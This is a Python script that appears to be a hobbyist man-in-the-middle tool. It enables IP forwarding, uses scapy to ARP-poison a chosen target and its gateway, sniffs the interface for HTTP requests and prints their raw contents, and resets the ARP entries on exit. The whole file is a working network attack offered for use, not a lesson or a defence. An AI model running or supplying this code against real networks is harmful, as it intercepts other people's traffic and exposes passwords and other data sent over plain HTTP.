import platform
import threading
import time
import scapy.all as scapy
import optparse
from scapy_http import http
from threading import Thread
import itertools
import subprocess
import os

def ip_forward():
    os_name = platform.system()
    print(f"Your OS is {os_name}.\n")
    print("[0]Default option for your OS\n[1]Linux\n[2]Ubuntu\n[3]Mac\n[4]Windows\n")
    user_option = int(input("Choose option for ip forwarding. (Recommended option : Default) : "))
    if user_option == 0:
        if "Linux" in os_name:
            subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            print(f"IP forwarding done! for {os_name}")
        if "Ubuntu" in os_name:
            subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            print(f"IP forwarding done! for {os_name}")
        if "Mac" in os_name:
            subprocess.call("sysctl -w net.inet.ip.forwarding=1", shell=True)
            print(f"IP forwarding done! for {os_name}")
        if "windows" in os_name:
            print("Your OS is windows. If you want to keep using program, you must the enable ip forwarding manually")

    if user_option == 1:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f"IP forwarding done! for {os_name}")
    if user_option == 2:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f"IP forwarding done! for {os_name}")
    if user_option == 3:
        subprocess.call("sysctl -w net.inet.ip.forwarding=1", shell=True)
        print(f"IP forwarding done! for {os_name}")
    if user_option == 4:
        print("Your OS is windows. You must the enable ip forwarding manually[Recommended]")

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter valid target IP address")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter valid gateway IP address")
    parse_object.add_option("-i", "--interface", dest="interface", help="Enter interface to listen (wlan0/eth0)")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Please enter a valid IP address or check --help command!")
        exit()
    if not options.gateway_ip:
        print("Please enter a valid gateway IP address or check --help command!")
        exit()

    return options

def get_mac_address(ip):
    arp_request_package = scapy.ARP(pdst=ip)
    broadcast_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_package = broadcast_package/arp_request_package
    answered_list = scapy.srp(combined_package, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoning_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoning_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip , gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=gateway_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False)

def listen_packages(interface):
    scapy.sniff(iface=interface,store=False,prn=analyze_packages)

def analyze_packages(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)

user_interface = get_user_input()
selected_interface = user_interface.interface
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
ip_forward()

class packageSender(threading.Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()

    def run(self):
        while True:
            arp_poisoning(user_target_ip, user_gateway_ip)
            arp_poisoning(user_gateway_ip, user_target_ip)
            for package_counter in itertools.count(start=2, step=2):
                print("\rSending Packages " + str(package_counter), end="")
                time.sleep(5)

class packageListener(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.daemon = True
        self.start()

    def run(self):
        while True:
            print("Listener Started!")
            listen_packages(selected_interface)

if __name__ =='__main__':
    send = packageSender()
    listen = packageListener()
    package_send = Thread(target=send.run)
    package_listen =Thread(target=listen.run)

try:
    while True:
        pass

except KeyboardInterrupt:
        print("\nStopping ARP Operation and resetting settings to default.")
        reset_operation(user_target_ip, user_gateway_ip)
        reset_operation(user_gateway_ip, user_target_ip)
        exit()


